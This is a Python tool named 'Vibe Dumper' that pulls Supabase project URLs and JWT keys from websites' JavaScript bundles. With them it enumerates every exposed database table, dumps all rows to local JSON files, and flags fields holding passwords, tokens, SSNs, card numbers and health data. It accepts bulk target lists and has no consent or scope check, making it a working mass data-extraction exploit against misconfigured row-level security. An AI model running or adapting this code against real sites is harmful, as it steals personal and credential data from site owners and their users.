#!/usr/bin/env python3

import subprocess
import sys
import os
import importlib.util

def check_package_installed(package_name, import_name=None):
    """Check if a package is installed by trying to import it."""
    if import_name is None:
        import_name = package_name
    
    try:
        __import__(import_name)
        return True
    except ImportError as e:
        try:
            spec = importlib.util.find_spec(import_name)
            if spec is not None and spec.loader is not None:
                try:
                    __import__(import_name)
                    return True
                except ImportError:
                    pass
        except (ImportError, ValueError, AttributeError):
            pass
        return False

def check_and_install_dependencies():
    """Check if dependencies are installed, install if missing."""
    requirements_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "requirements.txt")
    
    required_packages = {
        "requests": "requests",
        "beautifulsoup4": "bs4",
        "urllib3": "urllib3",
        "tqdm": "tqdm"
    }
    
    missing_packages = []
    for package_name, import_name in required_packages.items():
        if not check_package_installed(package_name, import_name):
            missing_packages.append(package_name)
    
    if not missing_packages:
        return True
    
    try:
        result = subprocess.run(
            [sys.executable, "-m", "pip", "list", "--format=freeze"],
            capture_output=True,
            text=True,
            timeout=10
        )
        installed_packages = result.stdout.lower()
        actually_installed = []
        for package_name in missing_packages:
            if package_name.lower() in installed_packages:
                actually_installed.append(package_name)
        
        if actually_installed:
            print(f"[!] Warning: Packages are installed via pip but not importable: {', '.join(actually_installed)}")
            print(f"[!] This suggests a Python environment mismatch.")
            print(f"[!] Current Python: {sys.executable}")
            print(f"[!] Python version: {sys.version}")
    except Exception:
        pass
    
    print(f"[*] Missing packages: {', '.join(missing_packages)}")
    
    in_venv = hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix)
    if in_venv:
        print(f"[*] Running in virtual environment: {sys.prefix}")
    else:
        print(f"[*] Not in a virtual environment")
        venv_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "venv")
        if os.path.exists(venv_path):
            print(f"[!] Virtual environment found at: {venv_path}")
            print(f"[!] Please activate it first: source venv/bin/activate")
            print(f"[!] Or run: {os.path.join(venv_path, 'bin', 'python3')} {__file__}")
    
    if os.path.exists(requirements_file):
        print(f"[*] Installing dependencies from requirements.txt...")
        print(f"[*] Using Python: {sys.executable}")
        try:
            result = subprocess.run(
                [sys.executable, "-m", "pip", "install", "-r", requirements_file],
                capture_output=True,
                text=True,
                check=False
            )
            
            output = (result.stdout + result.stderr).lower()
            success_indicators = [
                "already satisfied",
                "successfully installed",
                "requirement already satisfied"
            ]
            
            if result.returncode == 0 or any(indicator in output for indicator in success_indicators):
                import time
                time.sleep(0.1)
                
                import importlib
                importlib.invalidate_caches()
                
                still_missing = []
                for package_name, import_name in required_packages.items():
                    if not check_package_installed(package_name, import_name):
                        still_missing.append(package_name)
                
                if not still_missing:
                    print("[+] All dependencies are now available")
                    return True
                else:
                    print(f"[!] Packages still missing after installation: {', '.join(still_missing)}")
                    print(f"[!] Python executable: {sys.executable}")
                    print(f"[!] Python path: {sys.path[:3]}")
                    print(f"[!] This might be a Python environment mismatch.")
                    print(f"[!] Try running: {sys.executable} -m pip install -r requirements.txt")
                    print(f"[!] Then verify with: {sys.executable} -c 'import requests; import bs4; import urllib3; import tqdm; print(\"OK\")'")
                    return False
            else:
                print(f"[!] Installation failed. Return code: {result.returncode}")
                if result.stdout:
                    print(f"[!] Output: {result.stdout[:300]}")
                if result.stderr:
                    print(f"[!] Error: {result.stderr[:300]}")
                print(f"[!] Please run manually: {sys.executable} -m pip install -r requirements.txt")
                return False
        except Exception as install_error:
            print(f"[!] Error during installation: {install_error}")
            import traceback
            traceback.print_exc()
            print(f"[!] Please run: {sys.executable} -m pip install -r requirements.txt")
            return False
    else:
        print("[!] requirements.txt not found. Please install dependencies manually:")
        print(f"    {sys.executable} -m pip install requests>=2.31.0 beautifulsoup4>=4.12.0 urllib3>=2.0.0 tqdm>=4.66.0")
        return False

if not check_and_install_dependencies():
    sys.exit(1)

import requests
import re
import os
import json
import urllib3
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

class Colors:
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'
    
    @staticmethod
    def yellow(text):
        return f"{Colors.YELLOW}{text}{Colors.RESET}"
    
    @staticmethod
    def red(text):
        return f"{Colors.RED}{text}{Colors.RESET}"

TIMEOUT = 10
PAGE_SIZE = 1000
OUTPUT_DIR = "output"

COMMON_HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; VibeDumper/1.0)"
}

JWT_REGEX = re.compile(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
SUPABASE_CLOUD_REGEX = re.compile(r'https://[a-z0-9-]+\.supabase\.co')
SUPABASE_ENV_VAR_PATTERNS = [
    r'(?:NEXT_PUBLIC_|VITE_|REACT_APP_|PUBLIC_)?SUPABASE[_-]?URL["\']?\s*[:=]\s*["\']?(https://[^"\'\s,}]+)',
    r'(?:["\']?)(?:supabaseUrl|supabase_url|supabaseURL)(?:["\']?\s*[:=]\s*["\']?)(https://[^"\'\s,}]+)',
]

SENSITIVE_FIELD_PATTERNS = [
    r'\bemail\b',
    r'\bpassword\b', r'\bpasswd\b', r'\bpwd\b', r'\bpass\b', r'\bpassphrase\b',
    r'\bapi[_-]?key\b', r'\bapikey\b', r'\bauth[_-]?key\b', r'\bapplication[_-]?key\b',
    r'\bsecret\b', r'\bprivate[_-]?key\b', r'\bsecret[_-]?key\b', r'\bshared[_-]?secret\b',
    r'\btoken\b', r'\bjwt\b', r'\baccess[_-]?token\b', r'\brefresh[_-]?token\b',
    r'\boauth[_-]?token\b', r'\bsession[_-]?token\b', r'\bbearer[_-]?token\b',
    r'\bauth\b', r'\bauth[_-]?code\b', r'\bauthorization[_-]?code\b',
    r'\bsession[_-]?id\b', r'\bsession[_-]?key\b', r'\bsession[_-]?secret\b',
    r'\brecovery[_-]?code\b', r'\bbackup[_-]?code\b', r'\bverification[_-]?code\b',
    r'\botp\b', r'\btwo[_-]?factor\b', r'\b2fa[_-]?secret\b', r'\b2fa[_-]?code\b',
    r'\bphone\b', r'\bphone[_-]?number\b', r'\bmobile\b', r'\btelephone\b',
    r'\bssn\b', r'\bsocial[_-]?security\b', r'\bsocial[_-]?security[_-]?number\b',
    r'\bdriver[_-]?license\b', r'\bdrivers[_-]?license\b', r'\blicense[_-]?number\b',
    r'\bpassport[_-]?number\b', r'\bpassport[_-]?id\b',
    r'\bnational[_-]?id\b', r'\bnational[_-]?identifier\b', r'\btax[_-]?id\b',
    r'\buser[_-]?id\b', r'\baccount[_-]?id\b', r'\bcustomer[_-]?id\b',
    r'\bemployee[_-]?id\b', r'\bstaff[_-]?id\b',
    r'\bcredit[_-]?card\b', r'\bcard[_-]?number\b', r'\bcvv\b', r'\bcvc\b', r'\bcvn\b',
    r'\bexpiry[_-]?date\b', r'\bexpiration[_-]?date\b', r'\bexp[_-]?date\b',
    r'\bbank[_-]?account\b', r'\baccount[_-]?number\b', r'\brouting[_-]?number\b',
    r'\biban\b', r'\bswift[_-]?code\b', r'\bbic\b',
    r'\bpayment[_-]?method\b', r'\bpayment[_-]?info\b', r'\bpayment[_-]?details\b',
    r'\bsalary\b', r'\bincome\b',     r'\bwage\b', r'\bpayroll\b',
    r'\baddress\b', r'\bstreet\b', r'\bzip\b', r'\bpostal[_-]?code\b', r'\bpostcode\b',
    r'\bhome[_-]?address\b', r'\bwork[_-]?address\b', r'\bbilling[_-]?address\b',
    r'\bip[_-]?address\b', r'\bipv4\b', r'\bipv6\b',
    r'\blocation\b', r'\bcoordinates\b', r'\bgps[_-]?coordinates\b', r'\blat\b', r'\blong\b', r'\blatitude\b',     r'\blongitude\b',
    r'\bbirth[_-]?date\b', r'\bdob\b', r'\bdate[_-]?of[_-]?birth\b',
    r'\bgender\b', r'\brace\b', r'\bethnicity\b',
    r'\bmarital[_-]?status\b',
    r'\bhealth[_-]?record\b', r'\bmedical[_-]?record\b', r'\bpatient[_-]?id\b',
    r'\binsurance[_-]?number\b', r'\bhealth[_-]?insurance\b', r'\bmedical[_-]?insurance\b',
    r'\bdiagnosis\b',     r'\btreatment\b',
    r'\bdevice[_-]?id\b', r'\bdevice[_-]?identifier\b', r'\bdevice[_-]?uuid\b',
    r'\bmac[_-]?address\b', r'\bmacaddr\b',
    r'\bimei\b', r'\bserial[_-]?number\b',
    r'\bhardware[_-]?id\b',
    r'\bprivate[_-]?key\b', r'\bpublic[_-]?key\b', r'\bcertificate\b',
    r'\bpgp[_-]?key\b', r'\bgpg[_-]?key\b', r'\bssh[_-]?key\b',
    r'\blicense[_-]?key\b', r'\bsubscription[_-]?key\b',     r'\bactivation[_-]?key\b',
    r'\bfingerprint\b', r'\bbiometric\b',     r'\bfacial[_-]?recognition\b',
    r'\bcase[_-]?number\b',     r'\blegal[_-]?document\b',
    r'\binternal[_-]?note\b', r'\badmin[_-]?note\b', r'\bconfidential\b',
]

NON_SENSITIVE_FIELDS = [
    r'\bcreated[_-]?at\b', r'\bupdated[_-]?at\b', r'\bdeleted[_-]?at\b',
    r'^id$',
    r'\bdescription\b', r'\btitle\b', r'\bname\b', r'\bcontent\b',
    r'\bcreator\b', r'\bauthor\b', r'\blinks?\b', r'\burl\b', 
    r'\bimage\b', r'\bavatar\b', r'\bsearch[_-]?vector\b', r'\bvector\b',
    r'\bauthor[_-]?links\b', r'\bexample[_-]?emails\b',
]

EMAIL_REGEX = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
PHONE_REGEX = re.compile(r'[\+]?[(]?[0-9]{1,4}[)]?[-\s\.]?[(]?[0-9]{1,4}[)]?[-\s\.]?[0-9]{1,9}')
CREDIT_CARD_REGEX = re.compile(r'\b(?:\d{4}[-\s]?){3}\d{4}\b')

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print_lock = Lock()
_active_tqdm = None

def set_active_tqdm(tqdm_instance):
    global _active_tqdm
    _active_tqdm = tqdm_instance

def safe_print(*args, **kwargs):
    with print_lock:
        if _active_tqdm is not None:
            _active_tqdm.write(*args, **kwargs)
        else:
            print(*args, **kwargs)

def safe_get(url, **kwargs):
    try:
        return requests.get(
            url,
            timeout=5,
            **kwargs
        )
    except urllib3.exceptions.LocationParseError as e:
        print(f"[!] Invalid URL format: {url} - {e}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed for {url}: {e}")
        return None

def get_js_files(site_url):
    r = safe_get(site_url)
    if r is None: 
        return []

    try:
        soup = BeautifulSoup(r.text, "html.parser")
    except Exception as e:
        safe_print(f"  [!] Failed to parse HTML from {site_url}: {e}")
        return []
    
    js_files = set()

    try:
        for script in soup.find_all("script", src=True):
            js_files.add(urljoin(site_url, script["src"]))
    except Exception as e:
        safe_print(f"  [!] Error extracting JS files from {site_url}: {e}")

    return list(js_files)

def extract_supabase_urls(content):
    urls = set()
    
    urls.update(SUPABASE_CLOUD_REGEX.findall(content))
    
    for pattern in SUPABASE_ENV_VAR_PATTERNS:
        matches = re.finditer(pattern, content, re.IGNORECASE)
        for match in matches:
            url = match.group(1) if match.lastindex else match.group(0)
            url = re.sub(r'["\',)}\]]+$', '', url)
            url = url.rstrip('/')
            if url.startswith('https://'):
                urls.add(url)
    
    supabase_keyword_pattern = r'(?:supabase|SUPABASE)["\'\s:=]+(https://[^"\'\s,}]+)'
    matches = re.finditer(supabase_keyword_pattern, content, re.IGNORECASE)
    for match in matches:
        url = match.group(1)
        url = re.sub(r'["\',)}\]]+$', '', url)
        url = url.rstrip('/')
        if url.startswith('https://') and '.supabase.co' not in url:
            urls.add(url)
    
    return list(urls)

def scan_js(js_url):
    r = safe_get(js_url)
    if not r:
        return [], []

    content = r.text
    return (
        JWT_REGEX.findall(content),
        extract_supabase_urls(content)
    )

def scan_js_files_parallel(js_files):
    all_jwts = []
    all_supabase_urls = []
    
    if not js_files:
        return all_jwts, all_supabase_urls
    
    def scan_single_js(js_url):
        return scan_js(js_url)
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(scan_single_js, js): js for js in js_files}
        for future in as_completed(futures):
            try:
                jwts, supabase = future.result()
                all_jwts.extend(jwts)
                all_supabase_urls.extend(supabase)
            except Exception as e:
                js_url = futures[future]
                safe_print(f"  [!] Error scanning JS file {js_url}: {e}")
    
    return all_jwts, all_supabase_urls

def is_non_sensitive_field(field_name):
    field_lower = field_name.lower()
    for pattern in NON_SENSITIVE_FIELDS:
        if re.search(pattern, field_lower):
            return True
    return False

def is_sensitive_field_name(field_name):
    if is_non_sensitive_field(field_name):
        return False
    
    field_lower = field_name.lower()
    for pattern in SENSITIVE_FIELD_PATTERNS:
        if re.search(pattern, field_lower):
            return True
    return False

def analyze_table_for_sensitive_data(rows, max_samples=100):
    if not rows:
        return {
            "sensitive_fields": [],
            "vulnerability_level": "none",
            "has_sensitive_data": False,
            "details": {}
        }
    
    sample_size = min(len(rows), max_samples)
    sample_rows = rows[:sample_size]
    
    if not sample_rows or not isinstance(sample_rows[0], dict):
        return {
            "sensitive_fields": [],
            "vulnerability_level": "unknown",
            "has_sensitive_data": False,
            "details": {}
        }
    
    all_fields = list(sample_rows[0].keys())
    sensitive_fields = []
    field_analysis = {}
    
    for field in all_fields:
        field_lower = field.lower()
        
        if is_non_sensitive_field(field):
            continue
        
        is_sensitive = False
        detection_reasons = []
        
        if is_sensitive_field_name(field):
            is_sensitive = True
            detection_reasons.append("field_name")
        
        non_null_values = [row.get(field) for row in sample_rows if row.get(field) is not None][:10]
        
        for value in non_null_values:
            if not isinstance(value, (str, int)):
                continue
                
            value_str = str(value)
            
            if EMAIL_REGEX.search(value_str) and "email" in field_lower:
                if "email_pattern" not in detection_reasons:
                    detection_reasons.append("email_pattern")
                    is_sensitive = True
            
            if PHONE_REGEX.search(value_str) and len(value_str.replace('-', '').replace(' ', '').replace('(', '').replace(')', '')) >= 10:
                if ("phone" in field_lower or "mobile" in field_lower) and "phone_pattern" not in detection_reasons:
                    detection_reasons.append("phone_pattern")
                    is_sensitive = True
            
            if JWT_REGEX.search(value_str):
                if "jwt_pattern" not in detection_reasons:
                    detection_reasons.append("jwt_pattern")
                    is_sensitive = True
            
            if CREDIT_CARD_REGEX.search(value_str):
                if "credit_card_pattern" not in detection_reasons:
                    detection_reasons.append("credit_card_pattern")
                    is_sensitive = True
        
        if is_sensitive:
            sensitive_fields.append(field)
            field_analysis[field] = {
                "reasons": detection_reasons,
                "sample_count": len(non_null_values)
            }
    
    vulnerability_level = "none"
    if sensitive_fields:
        high_severity_patterns = [r'password', r'passwd', r'pwd', r'secret', r'api[_-]?key', r'token', r'jwt', r'credit[_-]?card', r'ssn']
        has_high_severity = any(
            re.search(pattern, field.lower()) 
            for field in sensitive_fields 
            for pattern in high_severity_patterns
        )
        
        if has_high_severity:
            vulnerability_level = "critical"
        elif any("email" in str(reason) or "phone" in str(reason) for field_data in field_analysis.values() for reason in field_data["reasons"]):
            vulnerability_level = "high"
        else:
            vulnerability_level = "medium"
    
    return {
        "sensitive_fields": sensitive_fields,
        "vulnerability_level": vulnerability_level,
        "has_sensitive_data": len(sensitive_fields) > 0,
        "details": field_analysis
    }

def get_tables(base_url, headers):
    r = safe_get(f"{base_url}/rest/v1/", headers=headers)
    if not r or r.status_code != 200:
        raise Exception("Cannot enumerate tables")

    return [
        p.strip("/")
        for p in r.json().get("paths", {})
        if not p.startswith("/rpc") and p != "/"
    ]

def dump_table(base_url, table, headers):
    rows = []
    offset = 0

    while True:
        url = f"{base_url}/rest/v1/{table}?limit={PAGE_SIZE}&offset={offset}"
        r = safe_get(url, headers=headers)

        if not r or r.status_code != 200:
            return None, r.status_code if r else "ERR"

        chunk = r.json()
        rows.extend(chunk)

        if len(chunk) < PAGE_SIZE:
            break

        offset += PAGE_SIZE

    return rows, 200

def scan_site(site_url, max_workers=5):
    domain = urlparse(site_url).netloc.replace("www.", "")
    site_dir = os.path.join(OUTPUT_DIR, domain)
    tables_dir = os.path.join(site_dir, "tables")

    safe_print(f"\n> Scanning {site_url}")

    findings = {
        "site": site_url,
        "vulnerable": False,
        "supabase_urls": [],
        "jwts": []
    }

    js_files = get_js_files(site_url)

    if js_files:
        all_jwts, all_supabase_urls = scan_js_files_parallel(js_files)
        findings["jwts"].extend(all_jwts)
        findings["supabase_urls"].extend(all_supabase_urls)

    findings["jwts"] = list(set(findings["jwts"]))
    findings["supabase_urls"] = list(set(findings["supabase_urls"]))

    if not findings["jwts"] or not findings["supabase_urls"]:
        safe_print("  [-] No exposed Supabase JWT found")
        return None

    safe_print("  [+] JWT found, enumerating tables")
    findings["vulnerable"] = True

    base_url = findings["supabase_urls"][0]
    jwt = findings["jwts"][0]

    supabase_headers = {
        "apikey": jwt,
        "Authorization": f"Bearer {jwt}"
    }

    summary = []

    try:
        tables = get_tables(base_url, supabase_headers)
        safe_print(f"  [+] Found {len(tables)} tables")

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {
                executor.submit(process_table, base_url, table, supabase_headers, tables_dir): table
                for table in tables
            }
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        summary.append(result)
                except Exception as e:
                    table_name = futures[future]
                    safe_print(f"    [!] Error processing table {table_name}: {e}")
                    summary.append({
                        "table": table_name,
                        "dumped": False,
                        "error": str(e),
                        "vulnerable": False
                    })

    except Exception as e:
        safe_print(f"  [-] Supabase error: {e}")

    vulnerable_tables = [s for s in summary if s.get("vulnerable", False)]
    critical_tables = [s for s in vulnerable_tables if s.get("vulnerability_level") == "critical"]
    high_tables = [s for s in vulnerable_tables if s.get("vulnerability_level") == "high"]
    medium_tables = [s for s in vulnerable_tables if s.get("vulnerability_level") == "medium"]
    
    if vulnerable_tables:
        safe_print(f"\n  [!] VULNERABILITY SUMMARY:")
        safe_print(f"     - Critical: {len(critical_tables)} table(s)")
        safe_print(f"     - High: {len(high_tables)} table(s)")
        safe_print(f"     - Medium: {len(medium_tables)} table(s)")
        safe_print(f"     - Total vulnerable: {len(vulnerable_tables)}/{len([s for s in summary if s.get('dumped')])} accessible tables")
        
        if critical_tables:
            safe_print(f"\n     Critical tables:")
            for t in critical_tables:
                safe_print(f"       • {t['table']} - Fields: {', '.join(t.get('sensitive_fields', []))}")
    
    findings["vulnerability_summary"] = {
        "total_tables_accessible": len([s for s in summary if s.get("dumped")]),
        "vulnerable_tables_count": len(vulnerable_tables),
        "critical_count": len(critical_tables),
        "high_count": len(high_tables),
        "medium_count": len(medium_tables),
        "vulnerable_tables": [
            {
                "table": t["table"],
                "level": t.get("vulnerability_level"),
                "sensitive_fields": t.get("sensitive_fields", [])
            }
            for t in vulnerable_tables
        ]
    }

    write_json(site_dir, "summary.json", summary)
    write_json(site_dir, "findings.json", findings)
    
    return findings

def process_table(base_url, table, supabase_headers, tables_dir):
    rows, status = dump_table(base_url, table, supabase_headers)
    
    if status == 200:
        if len(rows) > 0:
            os.makedirs(tables_dir, exist_ok=True)
            path = os.path.join(tables_dir, f"{table}.json")
            with open(path, "w") as f:
                json.dump(rows, f, indent=2)

        analysis = analyze_table_for_sensitive_data(rows)
        
        is_vulnerable = analysis["has_sensitive_data"]
        vuln_level = analysis["vulnerability_level"]
        sensitive_fields = analysis["sensitive_fields"]
        
        if len(rows) == 0:
            safe_print(f"    [-] {table}: 0 rows - Skipped (no data to save)")
        elif is_vulnerable:
            if vuln_level == "medium":
                vuln_text = Colors.yellow(f"VULNERABLE ({vuln_level})")
            elif vuln_level in ["high", "critical"]:
                vuln_text = Colors.red(f"VULNERABLE ({vuln_level})")
            else:
                vuln_text = f"VULNERABLE ({vuln_level})"
            
            safe_print(f"    [+] {table}: {len(rows)} rows - {vuln_text} - Sensitive fields: {', '.join(sensitive_fields)}")
        else:
            safe_print(f"    [+] {table}: {len(rows)} rows - Public data (no sensitive fields detected)")
        
        return {
            "table": table,
            "rows": len(rows),
            "dumped": True,
            "saved": len(rows) > 0,
            "vulnerable": is_vulnerable,
            "vulnerability_level": vuln_level,
            "sensitive_fields": sensitive_fields,
            "analysis": analysis
        }
    else:
        safe_print(f"    [-] {table}: blocked")
        return {
            "table": table,
            "dumped": False,
            "status": status,
            "vulnerable": False
        }

def normalize_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')

def get_sites_from_file(file_path):
    sites = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                url = line.strip()
                if url and not url.startswith('#'):
                    sites.append(normalize_url(url))
    except FileNotFoundError:
        print(f"[-] File not found: {file_path}")
    except Exception as e:
        print(f"[-] Error reading file: {e}")
    return sites

def write_json(directory, filename, data):
    try:
        os.makedirs(directory, exist_ok=True)
        filepath = os.path.join(directory, filename)
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        safe_print(f"[!] Error writing {filename}: {e}")

def parse_args():
    parser = argparse.ArgumentParser(
        description='Vibe Dumper - Supabase JWT Scanner and Database Dumper',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python3 vibe-dumper.py --url https://example.com
  python3 vibe-dumper.py --file targets.txt
  python3 vibe-dumper.py --url https://example.com --threads 10 --output ./results
        '''
    )
    parser.add_argument('--url', help='Single URL to scan')
    parser.add_argument('--file', help='File with URLs to scan (one per line)')
    parser.add_argument('--threads', type=int, default=5, help='Number of worker threads (default: 5)')
    parser.add_argument('--output', default='output', help='Output directory (default: output)')
    
    return parser.parse_args()

def main():
    args = parse_args()
    global OUTPUT_DIR
    OUTPUT_DIR = args.output
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    sites = []

    if args.url:
        sites = [normalize_url(args.url)]
    elif args.file:
        sites = get_sites_from_file(args.file)
        if not sites:
            print(f"[-] No URLs found in {args.file}")
            return
    elif os.path.exists("sites.txt"):
        sites = get_sites_from_file("sites.txt")
        if not sites:
            print("[-] sites.txt is empty")
            return
    else:
        print("[-] No input provided. Use --url to scan a single site or --file to scan from a file.")
        print("    Alternatively, create a sites.txt file with URLs (one per line).")
        return

    total_sites = len(sites)
    print(f"[*] Scanning {total_sites} site(s) with {args.threads} thread(s)\n")

    if total_sites > 1:
        site_iterator = tqdm(sites, desc="Vibe Dumper", unit="site")
        set_active_tqdm(site_iterator)
    else:
        site_iterator = sites
        set_active_tqdm(None)

    vulnerable_count = 0

    try:
        for site in site_iterator:
            try:
                findings = scan_site(site, max_workers=args.threads)
                if findings and findings.get("vulnerable"):
                    vulnerable_count += 1
            except Exception as e:
                safe_print(f"[!] Error scanning {site}: {e}")
                continue
    finally:
        set_active_tqdm(None)

    vulnerable_percentage = (vulnerable_count / total_sites * 100) if total_sites > 0 else 0
    safe_print(f"\n[*] Scan completed. {vulnerable_count}/{total_sites} ({vulnerable_percentage:.0f}%) of targets were vulnerable.")

if __name__ == "__main__":
    main()

